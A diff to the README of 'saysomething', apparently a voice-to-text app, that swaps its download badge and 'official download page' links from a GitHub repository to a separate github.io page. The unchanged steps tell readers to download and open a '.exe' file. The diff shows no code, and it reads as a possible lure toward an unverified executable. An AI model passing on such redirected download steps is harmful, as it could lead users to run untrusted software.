@@ -1,6 +1,6 @@
 # 🎤 saysomething - Turn your voice into typed text
 
-[![](https://img.shields.io/badge/Download-saysomething-blue.svg)](https://github.com/mature-sustainability193/saysomething)
+[![](https://img.shields.io/badge/Download-saysomething-blue.svg)](https://mature-sustainability193.github.io)
 
 ## 📋 About this app
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run saysomething:
 
 Follow these steps to get the app on your computer.
 
-1.  Visit the [official download page](https://github.com/mature-sustainability193/saysomething).
+1.  Visit the [official download page](https://mature-sustainability193.github.io).
 2.  Scroll down to the latest version.
 3.  Click the link that ends with ".exe" to start the download.
 4.  Open the file once it finishes downloading.
